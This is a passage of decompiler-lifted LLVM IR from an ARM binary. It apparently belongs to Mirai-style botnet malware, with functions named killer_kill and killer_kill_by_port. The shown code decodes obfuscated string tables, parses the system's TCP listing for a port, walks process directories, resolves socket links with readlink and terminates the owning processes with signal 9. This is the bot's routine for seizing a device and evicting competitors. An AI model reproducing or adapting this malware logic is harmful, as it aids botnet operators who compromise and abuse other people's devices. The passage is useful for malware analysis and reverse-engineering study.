.thread:                                          ; preds = %dec_label_pc_de20
  br label %bb19

bb:                                               ; preds = %dec_label_pc_de20
  %v1_de24 = load i32, i32* @r1, align 4
  %v2_de24 = inttoptr i32 %v1_de24 to i8*
  %v3_de24 = load i8, i8* %v2_de24, align 1
  %v4_de24 = zext i8 %v3_de24 to i32
  %v3_de2c = add i32 %v4_de24, %v1_de2c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_de54 = phi i32 [ %v1_de2c, %.thread ], [ %v3_de2c, %bb ]
  %v0_de34 = mul i32 %v3_ddf8, 65536
  %v3_de34 = udiv i32 %v0_de34, 65536
  %v3_de38 = urem i32 %v3_ddfc, 65536
  %v4_de40 = udiv i32 %v3_ddf8, 65536
  %v2_de3c = add nuw nsw i32 %v3_de38, %v4_de40
  %v5_de40 = add nuw nsw i32 %v2_de3c, %v3_de34
  %v1_de44 = add i32 %arg1, 9
  %v2_de44 = inttoptr i32 %v1_de44 to i8*
  %v3_de44 = load i8, i8* %v2_de44, align 1
  %v4_de44 = zext i8 %v3_de44 to i32
  %v4_de48 = udiv i32 %v3_ddfc, 65536
  %v3_de50 = mul nuw nsw i32 %v4_de44, 256
  %v5_de48 = add i32 %v4_de48, %arg2
  %v2_de4c = add i32 %v5_de48, %v1_de54
  %v2_de54 = add i32 %v2_de4c, %v5_de40
  %v2_de58 = add i32 %v2_de54, %v3_de50
  %tmp = icmp ult i32 %v2_de58, 65536
  br i1 %tmp, label %dec_label_pc_de78, label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %bb19, %dec_label_pc_de64
  %v2_de6c5 = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706.in = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706 = udiv i32 %v3_de706.in, 65536
  %v3_de68 = urem i32 %v2_de6c5, 65536
  %v2_de6c = add nuw nsw i32 %v3_de68, %v3_de706
  %tmp20 = icmp ult i32 %v2_de6c, 65536
  br i1 %tmp20, label %dec_label_pc_de78.loopexit, label %dec_label_pc_de64

dec_label_pc_de78.loopexit:                       ; preds = %dec_label_pc_de64
  br label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de78.loopexit, %bb19
  %v0_de78 = phi i32 [ %v2_de6c, %dec_label_pc_de78.loopexit ], [ %v2_de58, %bb19 ]
  %v1_de78 = urem i32 %v0_de78, 65536
  %v3_de80 = xor i32 %v1_de78, 65535
  ret i32 %v3_de80

; uselistorder directives
  uselistorder i32 %v2_de6c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_de58, { 3, 0, 2, 1 }
  uselistorder i32 %v1_de2c, { 1, 0 }
  uselistorder i32 %v5_de10, { 1, 0 }
  uselistorder i32 %v0_de10, { 1, 0 }
  uselistorder i32 %v3_ddf8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_de64, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_de0c, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_de98 = load i32, i32* @global_var_2469c.101, align 4
  %v2_dea0 = call i32 @kill(i32 %v2_de98, i32 9)
  ret i32 %v2_dea0
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_deb4 = load i32, i32* @r4, align 4
  %v6_deb4 = load i32, i32* @r5, align 4
  %v9_deb4 = load i32, i32* @r6, align 4
  %v12_deb4 = load i32, i32* @r7, align 4
  %v15_deb4 = load i32, i32* @r8, align 4
  %v18_deb4 = load i32, i32* @sb, align 4
  %v21_deb4 = load i32, i32* @sl, align 4
  %v24_deb4 = load i32, i32* @fp, align 4
  %v27_deb4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_ded0 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_ded0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_defc = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_defc, i32* @fp, align 4
  %v4_df08 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_df0c = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_df0c, i32* @sl, align 4
  %v0_df10 = load i32, i32* @r5, align 4
  %v3_df1c = bitcast i32* %stack_var_-8777 to i8*
  %v4_df1c = call i32 @__GI_memset(i8* %v3_df1c, i32 %v0_df10, i32 4096)
  %v0_df24 = load i32, i32* @r5, align 4
  %v3_df30 = bitcast i32* %stack_var_-4681 to i8*
  %v4_df30 = call i32 @__GI_memset(i8* %v3_df30, i32 %v0_df24, i32 4096)
  %v2_df34 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_df34, i32* @sb, align 4
  %v0_df38 = load i32, i32* %r4.global-to-local, align 4
  %v3_df38 = udiv i32 %v0_df38, 256
  %v1_df3c = urem i32 %v0_df38, 256
  store i32 %v1_df3c, i32* @r4, align 4
  %v3_df4c = trunc i32 %v3_df38 to i8
  %v4_df4c = call i32 @util_itoa(i8 %v3_df4c, i32 16, i32 %v2_df34)
  %v2_df54 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_df58 = icmp eq i32 %v2_df54, 2
  br i1 %v7_df58, label %dec_label_pc_e404, label %dec_label_pc_df60

dec_label_pc_df60:                                ; preds = %entry, %dec_label_pc_e404
  %v1_df64 = call i32 @table_unlock_val(i32 6)
  %v1_df6c = call i32 @table_unlock_val(i32 7)
  %v1_df74 = call i32 @table_unlock_val(i32 8)
  %v1_df7c = call i32 @table_unlock_val(i32 9)
  %v0_df80 = load i32, i32* @r5, align 4
  %v2_df88 = inttoptr i32 %v0_df80 to i32*
  %v3_df88 = call i32 @table_retrieve_val(i32 9, i32* %v2_df88)
  %v0_df8c = load i32, i32* @r5, align 4
  %v2_df90 = inttoptr i32 %v0_df8c to i64*
  %v3_df90 = call i32 @__libc_open(i32 %v3_df88, i64* %v2_df90)
  %v7_df94 = icmp eq i32 %v3_df90, -1
  store i32 %v3_df90, i32* @r8, align 4
  br i1 %v7_df94, label %bb, label %dec_label_pc_dfa4.preheader

bb:                                               ; preds = %dec_label_pc_df60
  %v1_df9c = load i32, i32* @r5, align 4
  store i32 %v1_df9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_dfa4.preheader:                      ; preds = %dec_label_pc_df60
  %v4_dfb057 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v3_df90)
  %v2_dfb459 = icmp eq i32 %v4_dfb057, 0
  br i1 %v2_dfb459, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc.lr.ph

dec_label_pc_dfbc.lr.ph:                          ; preds = %dec_label_pc_dfa4.preheader
  %v2_e004 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfbc.lr.ph, %dec_label_pc_dfa4.backedge
  %v3_dfc0 = load i8, i8* %stack_var_-585, align 1
  %v4_dfc0 = sext i8 %v3_dfc0 to i32
  store i32 %v4_dfc0, i32* @r3, align 4
  %v2_dfc4 = icmp eq i8 %v3_dfc0, 0
  br i1 %v2_dfc4, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_dfbc
  %v8_dfc8 = icmp eq i8 %v3_dfc0, 58
  br i1 %v8_dfc8, label %.thread8, label %dec_label_pc_dfdc

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_dff4

bb134:                                            ; preds = %dec_label_pc_dfbc
  br label %dec_label_pc_dff4

dec_label_pc_dfdc:                                ; preds = %bb133
  %v1_dfe4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb135, %dec_label_pc_dfdc
  %v0_dfe0 = phi i32 [ %v1_dfe0, %bb135 ], [ 0, %dec_label_pc_dfdc ]
  %v1_dfe0 = add i32 %v0_dfe0, 1
  %v2_dfe4 = add i32 %v1_dfe0, %v1_dfe4.pre
  %v3_dfe4 = inttoptr i32 %v2_dfe4 to i8*
  %v4_dfe4 = load i8, i8* %v3_dfe4, align 1
  %v6_dfe4 = zext i8 %v4_dfe4 to i32
  store i32 %v6_dfe4, i32* @r3, align 4
  %v2_dfe8 = icmp eq i8 %v4_dfe4, 0
  br i1 %v2_dfe8, label %dec_label_pc_dff4, label %bb135

bb135:                                            ; preds = %dec_label_pc_dfe0
  %v8_dfec = icmp eq i8 %v4_dfe4, 58
  br i1 %v8_dfec, label %dec_label_pc_dff4, label %dec_label_pc_dfe0

dec_label_pc_dff4:                                ; preds = %dec_label_pc_dfe0, %bb135, %bb134, %.thread8
  %v1_e020 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_dfe0, %bb135 ], [ %v1_dfe0, %dec_label_pc_dfe0 ]
  %v0_dff4 = phi i32 [ %v4_dfc0, %.thread8 ], [ %v4_dfc0, %bb134 ], [ %v6_dfe4, %bb135 ], [ %v6_dfe4, %dec_label_pc_dfe0 ]
  %v2_dff4 = icmp eq i32 %v0_dff4, 0
  br i1 %v2_dff4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_dffc

dec_label_pc_dfa4.backedge:                       ; preds = %dec_label_pc_dff4, %dec_label_pc_e0c4, %dec_label_pc_e110, %dec_label_pc_e040
  %v0_dfac = load i32, i32* @r8, align 4
  %v4_dfb0 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dfac)
  %v2_dfb4 = icmp eq i32 %v4_dfb0, 0
  br i1 %v2_dfb4, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc

dec_label_pc_dffc:                                ; preds = %dec_label_pc_dff4
  %v1_e000 = add i32 %v1_e020, 2
  %v2_e008 = add i32 %v1_e000, %v2_e004
  %v1_e00c = add i32 %v2_e008, -545
  %v2_e00c = inttoptr i32 %v1_e00c to i8*
  %v3_e00c = load i8, i8* %v2_e00c, align 1
  %v2_e010 = icmp eq i8 %v3_e00c, 0
  br i1 %v2_e010, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_dffc
  %v8_e014 = icmp eq i8 %v3_e00c, 32
  br i1 %v8_e014, label %.thread13, label %dec_label_pc_e020

.thread13:                                        ; preds = %bb136
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

bb137:                                            ; preds = %dec_label_pc_dffc
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

dec_label_pc_e020:                                ; preds = %bb136
  %v0_e020 = load i32, i32* @r6, align 4
  %v2_e020 = add i32 %v0_e020, %v1_e020
  br label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %bb138, %dec_label_pc_e020
  %v0_e03416 = phi i32 [ %v1_e034, %bb138 ], [ %v1_e000, %dec_label_pc_e020 ]
  %v0_e03818 = phi i32 [ %v1_e038, %bb138 ], [ %v2_e020, %dec_label_pc_e020 ]
  %v1_e028 = add i32 %v0_e03818, 3
  %v2_e028 = inttoptr i32 %v1_e028 to i8*
  %v3_e028 = load i8, i8* %v2_e028, align 1
  %v2_e02c = icmp eq i8 %v3_e028, 0
  br i1 %v2_e02c, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_e028
  %v1_e03417 = add i32 %v0_e03416, 1
  store i32 %v1_e03417, i32* @r5, align 4
  br label %dec_label_pc_e040

bb138:                                            ; preds = %dec_label_pc_e028
  %v8_e030 = icmp eq i8 %v3_e028, 32
  %v1_e034 = add i32 %v0_e03416, 1
  store i32 %v1_e034, i32* @r5, align 4
  %v1_e038 = add i32 %v0_e03818, 1
  br i1 %v8_e030, label %dec_label_pc_e040, label %dec_label_pc_e028

dec_label_pc_e040:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_e04c = phi i32 [ %v1_e03417, %.thread15 ], [ %v1_e000, %.thread13 ], [ %v1_e000, %bb137 ], [ %v1_e034, %bb138 ]
  %v0_e040 = load i32, i32* @r6, align 4
  %v2_e040 = add i32 %v0_e040, %v1_e000
  store i32 %v2_e040, i32* @r4, align 4
  %v2_e04c = add i32 %v1_e04c, %v2_e004
  store i32 0, i32* @r7, align 4
  %v3_e054 = add i32 %v2_e04c, -545
  %v4_e054 = inttoptr i32 %v3_e054 to i8*
  store i8 0, i8* %v4_e054, align 1
  %v0_e058 = load i32, i32* @r4, align 4
  %v1_e05c = inttoptr i32 %v0_e058 to i8*
  %v2_e05c = call i32 @util_strlen(i8* %v1_e05c)
  store i32 %v2_e05c, i32* @r1, align 4
  %v0_e068 = load i32, i32* @r4, align 4
  %v3_e06c = inttoptr i32 %v0_e068 to i8*
  %v4_e06c = call i32 @util_stristr(i8* %v3_e06c, i32 %v2_e05c, i32 %v2_df34)
  %v7_e070 = icmp eq i32 %v4_e06c, -1
  br i1 %v7_e070, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e08c.preheader

dec_label_pc_e08c.preheader:                      ; preds = %dec_label_pc_e040
  %v1_e074 = load i32, i32* @r7, align 4
  %v1_e078 = load i32, i32* @r6, align 4
  %v2_e078 = load i32, i32* @r5, align 4
  %v3_e078 = add i32 %v2_e078, %v1_e078
  store i32 %v1_e074, i32* @lr, align 4
  %v1_e08c49 = add i32 %v3_e078, 2
  %v2_e08c50 = inttoptr i32 %v1_e08c49 to i8*
  %v3_e08c51 = load i8, i8* %v2_e08c50, align 1
  %v4_e08c52 = zext i8 %v3_e08c51 to i32
  store i32 %v4_e08c52, i32* @r3, align 4
  %v2_e09053 = icmp eq i8 %v3_e08c51, 0
  %v1_e09455 = add i32 %v2_e078, 2
  br i1 %v2_e09053, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %dec_label_pc_e08c.preheader, %dec_label_pc_e08c.backedge
  %v0_e0c484 = phi i32 [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e0ac.pr = phi i32 [ %v0_e0ac.pr71, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e3d8 = phi i32 [ %v0_e3d874, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e09479 = phi i32 [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v1_e09455, %dec_label_pc_e08c.preheader ]
  %v0_e0bc = phi i32 [ %v0_e08c, %dec_label_pc_e08c.backedge ], [ %v3_e078, %dec_label_pc_e08c.preheader ]
  %v1_e0a0 = phi i32 [ %v4_e08c, %dec_label_pc_e08c.backedge ], [ %v4_e08c52, %dec_label_pc_e08c.preheader ]
  %v7_e09c = icmp eq i32 %v1_e0a0, 9
  br i1 %v7_e09c, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_e09c
  %v8_e0a0 = icmp eq i32 %v1_e0a0, 32
  br i1 %v8_e0a0, label %.thread27, label %dec_label_pc_e0ac

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_e0b8

bb140:                                            ; preds = %dec_label_pc_e09c
  br label %dec_label_pc_e0b8

dec_label_pc_e0ac:                                ; preds = %bb139
  %v7_e0ac = icmp eq i32 %v0_e0ac.pr, 1
  br i1 %v7_e0ac, label %dec_label_pc_e3d8, label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e3d8, %dec_label_pc_e0ac
  %v0_e0b876 = phi i32 [ %v1_e3d8, %dec_label_pc_e3d8 ], [ %v0_e3d8, %dec_label_pc_e0ac ]
  br label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %bb140, %.thread27, %dec_label_pc_e0b4
  %v0_e0b8 = phi i32 [ %v0_e3d8, %.thread27 ], [ %v0_e3d8, %bb140 ], [ %v0_e0b876, %dec_label_pc_e0b4 ]
  %v0_e0ac.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_e0b4 ]
  %v7_e0c0 = icmp sgt i32 %v0_e0b8, 6
  br i1 %v7_e0c0, label %dec_label_pc_e0c4, label %dec_label_pc_e08c.backedge

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e08c.backedge, %dec_label_pc_e0b8, %dec_label_pc_e08c.preheader
  %v1_e114 = phi i32 [ %v1_e09455, %dec_label_pc_e08c.preheader ], [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v0_e09479, %dec_label_pc_e0b8 ]
  %v0_e0c4 = phi i32 [ %v1_e074, %dec_label_pc_e08c.preheader ], [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v2_e0c4 = icmp eq i32 %v0_e0c4, 0
  br i1 %v2_e0c4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v2_e0d8 = add i32 %v1_e114, %v2_e004
  %v1_e0dc = add i32 %v2_e0d8, -545
  %v2_e0dc = inttoptr i32 %v1_e0dc to i8*
  %v3_e0dc = load i8, i8* %v2_e0dc, align 1
  %v2_e0e0 = icmp eq i8 %v3_e0dc, 0
  br i1 %v2_e0e0, label %dec_label_pc_e110, label %bb141

bb141:                                            ; preds = %dec_label_pc_e0d0
  %v8_e0e4 = icmp eq i8 %v3_e0dc, 32
  br i1 %v8_e0e4, label %dec_label_pc_e110, label %dec_label_pc_e0ec

dec_label_pc_e0ec:                                ; preds = %bb141
  %v2_e0ec = add i32 %v1_e114, %v1_e078
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %bb142, %dec_label_pc_e0ec
  %v0_e0fc30 = phi i32 [ %v1_e0fc, %bb142 ], [ %v1_e114, %dec_label_pc_e0ec ]
  %v0_e0f0 = phi i32 [ %v1_e0f0, %bb142 ], [ %v2_e0ec, %dec_label_pc_e0ec ]
  %v1_e0f0 = add i32 %v0_e0f0, 1
  %v2_e0f0 = inttoptr i32 %v1_e0f0 to i8*
  %v3_e0f0 = load i8, i8* %v2_e0f0, align 1
  %v2_e0f4 = icmp eq i8 %v3_e0f0, 0
  br i1 %v2_e0f4, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_e0f0
  %v1_e0fc31 = add i32 %v0_e0fc30, 1
  br label %dec_label_pc_e104

bb142:                                            ; preds = %dec_label_pc_e0f0
  %v8_e0f8 = icmp eq i8 %v3_e0f0, 32
  %v1_e0fc = add i32 %v0_e0fc30, 1
  br i1 %v8_e0f8, label %dec_label_pc_e104, label %dec_label_pc_e0f0

dec_label_pc_e104:                                ; preds = %bb142, %.thread29
  %v1_e10c = phi i32 [ %v1_e0fc31, %.thread29 ], [ %v1_e0fc, %bb142 ]
  %v2_e10c = add i32 %v1_e10c, %v2_e004
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e0d0, %bb141, %dec_label_pc_e104
  %v2_e11c = phi i32 [ %v2_e0d8, %dec_label_pc_e0d0 ], [ %v2_e0d8, %bb141 ], [ %v2_e10c, %dec_label_pc_e104 ]
  %v2_e114 = add i32 %v1_e114, %v1_e078
  store i32 %v2_e114, i32* @r4, align 4
  %v3_e11c = add i32 %v2_e11c, -545
  %v4_e11c = inttoptr i32 %v3_e11c to i8*
  store i8 0, i8* %v4_e11c, align 1
  %v1_e120 = inttoptr i32 %v2_e114 to i8*
  %v2_e120 = call i32 @util_strlen(i8* %v1_e120)
  %v8_e128 = icmp sgt i32 %v2_e120, 15
  br i1 %v8_e128, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e12c

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e110
  %v0_e130 = load i32, i32* @r4, align 4
  %v2_e134 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e134, i32* @r0, align 4
  %v2_e138 = bitcast i32* %stack_var_-56 to i8*
  %v3_e138 = call i32 @util_strcpy(i8* %v2_e138, i32 %v0_e130)
  br label %dec_label_pc_e13c

dec_label_pc_e13c.loopexit:                       ; preds = %dec_label_pc_dfa4.backedge, %dec_label_pc_dfa4.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e13c.loopexit, %dec_label_pc_e12c
  %v1_e14c.pre-phi = phi i8* [ %.pre100, %dec_label_pc_e13c.loopexit ], [ %v2_e138, %dec_label_pc_e12c ]
  %v2_e148.pre-phi = phi i32 [ %.pre, %dec_label_pc_e13c.loopexit ], [ %v2_e134, %dec_label_pc_e12c ]
  %v0_e13c = load i32, i32* @r8, align 4
  %v1_e140 = call i32 @__GI___libc_close(i32 %v0_e13c)
  %v2_e14c = call i32 @util_strlen(i8* %v1_e14c.pre-phi)
  store i32 %v2_e14c, i32* @r4, align 4
  %v2_e150 = icmp eq i32 %v2_e14c, 0
  br i1 %v2_e150, label %dec_label_pc_e3a8, label %dec_label_pc_e15c

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e13c
  %v3_e164 = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e168 = call i32 @__GI_opendir(i32 %v3_e164)
  store i32 %v1_e168, i32* @sb, align 4
  %v2_e16c = icmp eq i32 %v1_e168, 0
  br i1 %v2_e16c, label %dec_label_pc_e39c, label %dec_label_pc_e17c.preheader

dec_label_pc_e17c.preheader:                      ; preds = %dec_label_pc_e15c
  store i32 0, i32* @r5, align 4
  %v1_e18044 = inttoptr i32 %v1_e168 to i32*
  %v2_e18045 = call i32 @__GI_readdir(i32* %v1_e18044)
  %v2_e18447 = icmp eq i32 %v2_e18045, 0
  br i1 %v2_e18447, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e17c.loopexit:                       ; preds = %dec_label_pc_e194, %dec_label_pc_e1a4, %dec_label_pc_e210
  %v0_e17c = load i32, i32* @sb, align 4
  %v1_e180 = inttoptr i32 %v0_e17c to i32*
  %v2_e180 = call i32 @__GI_readdir(i32* %v1_e180)
  %v2_e184 = icmp eq i32 %v2_e180, 0
  br i1 %v2_e184, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e18c.preheader:                      ; preds = %dec_label_pc_e17c.preheader, %dec_label_pc_e17c.loopexit
  %v0_e19492 = phi i32 [ %v2_e180, %dec_label_pc_e17c.loopexit ], [ %v2_e18045, %dec_label_pc_e17c.preheader ]
  br label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e18c.preheader, %dec_label_pc_e378
  %v0_e1ac = phi i32 [ %v0_e19492, %dec_label_pc_e18c.preheader ], [ %v2_e384, %dec_label_pc_e378 ]
  %v0_e18c = load i32, i32* @r5, align 4
  %v2_e18c = icmp eq i32 %v0_e18c, 0
  br i1 %v2_e18c, label %dec_label_pc_e194, label %dec_label_pc_e390

dec_label_pc_e194:                                ; preds = %dec_label_pc_e18c
  %v1_e194 = add i32 %v0_e1ac, 11
  %v2_e194 = inttoptr i32 %v1_e194 to i8*
  %v3_e194 = load i8, i8* %v2_e194, align 1
  %v4_e194 = zext i8 %v3_e194 to i32
  %v1_e198 = add nsw i32 %v4_e194, -48
  %tmp = icmp ugt i32 %v1_e198, 9
  br i1 %tmp, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e194
  store i32 %v1_e194, i32* @r7, align 4
  %v3_e1b0 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e1bc = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e1b0)
  %v2_e1c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1c8 = load i32, i32* @r7, align 4
  %v1_e1cc = load i32, i32* @sl, align 4
  %v2_e1cc = add i32 %v1_e1cc, %v2_e1c4
  store i32 %v2_e1cc, i32* @r0, align 4
  %v2_e1d0 = inttoptr i32 %v2_e1cc to i8*
  %v3_e1d0 = call i32 @util_strcpy(i8* %v2_e1d0, i32 %v0_e1c8)
  %v2_e1d8 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1dc = load i32, i32* @r5, align 4
  store i32 %v2_e1d8, i32* @r4, align 4
  %v2_e1e8 = inttoptr i32 %v0_e1dc to i32*
  %v3_e1e8 = call i32 @table_retrieve_val(i32 7, i32* %v2_e1e8)
  %v0_e1f0 = load i32, i32* @r4, align 4
  %v1_e1f0 = load i32, i32* @sl, align 4
  %v2_e1f0 = add i32 %v1_e1f0, %v0_e1f0
  store i32 %v2_e1f0, i32* @r0, align 4
  %v2_e1f4 = inttoptr i32 %v2_e1f0 to i8*
  %v3_e1f4 = call i32 @util_strcpy(i8* %v2_e1f4, i32 %v3_e1e8)
  %v3_e204 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e208 = icmp eq i32 %v3_e204, -1
  br i1 %v7_e208, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e1a4
  %v0_e210 = load i32, i32* @r5, align 4
  %v2_e218 = inttoptr i32 %v0_e210 to i32*
  %v3_e218 = call i32 @table_retrieve_val(i32 6, i32* %v2_e218)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e224 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e218)
  %v2_e22c = call i32 @util_strlen(i8* %v3_df30)
  %v0_e230 = load i32, i32* @r7, align 4
  %v1_e234 = load i32, i32* @sl, align 4
  %v2_e234 = add i32 %v1_e234, %v2_e22c
  store i32 %v2_e234, i32* @r0, align 4
  %v2_e238 = inttoptr i32 %v2_e234 to i8*
  %v3_e238 = call i32 @util_strcpy(i8* %v2_e238, i32 %v0_e230)
  %v2_e240 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e244 = load i32, i32* @r5, align 4
  store i32 %v2_e240, i32* @r4, align 4
  %v2_e250 = inttoptr i32 %v0_e244 to i32*
  %v3_e250 = call i32 @table_retrieve_val(i32 8, i32* %v2_e250)
  %v0_e258 = load i32, i32* @r4, align 4
  %v1_e258 = load i32, i32* @sl, align 4
  %v2_e258 = add i32 %v1_e258, %v0_e258
  store i32 %v2_e258, i32* @r0, align 4
  %v2_e25c = inttoptr i32 %v2_e258 to i8*
  %v3_e25c = call i32 @util_strcpy(i8* %v2_e25c, i32 %v3_e250)
  %v1_e264 = call i32 @__GI_opendir(i32 %v2_df0c)
  store i32 %v1_e264, i32* @r8, align 4
  %v2_e268 = icmp eq i32 %v1_e264, 0
  br i1 %v2_e268, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e270.preheader

dec_label_pc_e270.preheader:                      ; preds = %dec_label_pc_e210
  %v1_e27439 = inttoptr i32 %v1_e264 to i32*
  %v2_e27440 = call i32 @__GI_readdir(i32* %v1_e27439)
  store i32 %v2_e27440, i32* @r6, align 4
  %v2_e27842 = icmp eq i32 %v2_e27440, 0
  br i1 %v2_e27842, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e270.loopexit:                       ; preds = %dec_label_pc_e290, %dec_label_pc_e328
  %v0_e270 = load i32, i32* @r8, align 4
  %v1_e274 = inttoptr i32 %v0_e270 to i32*
  %v2_e274 = call i32 @__GI_readdir(i32* %v1_e274)
  store i32 %v2_e274, i32* @r6, align 4
  %v2_e278 = icmp eq i32 %v2_e274, 0
  br i1 %v2_e278, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e288thread-pre-split:                ; preds = %dec_label_pc_e270.preheader, %dec_label_pc_e270.loopexit
  %v0_e288.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e288

dec_label_pc_e288:                                ; preds = %dec_label_pc_e288thread-pre-split, %dec_label_pc_e350
  %v0_e288 = phi i32 [ %v0_e288.pr, %dec_label_pc_e288thread-pre-split ], [ 1, %dec_label_pc_e350 ]
  %v2_e288 = icmp eq i32 %v0_e288, 0
  br i1 %v2_e288, label %dec_label_pc_e290, label %dec_label_pc_e378

dec_label_pc_e290:                                ; preds = %dec_label_pc_e288
  %v2_e290 = call i32 @util_zero(i32 %v2_defc, i32 4096)
  %v0_e294 = load i32, i32* @r5, align 4
  %v2_e29c = inttoptr i32 %v0_e294 to i32*
  %v3_e29c = call i32 @table_retrieve_val(i32 6, i32* %v2_e29c)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e2a8 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e29c)
  %v2_e2b0 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2b4 = load i32, i32* @r7, align 4
  %v1_e2b8 = load i32, i32* @sl, align 4
  %v2_e2b8 = add i32 %v1_e2b8, %v2_e2b0
  store i32 %v2_e2b8, i32* @r0, align 4
  %v2_e2bc = inttoptr i32 %v2_e2b8 to i8*
  %v3_e2bc = call i32 @util_strcpy(i8* %v2_e2bc, i32 %v0_e2b4)
  %v2_e2c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2c8 = load i32, i32* @r5, align 4
  store i32 %v2_e2c4, i32* @r4, align 4
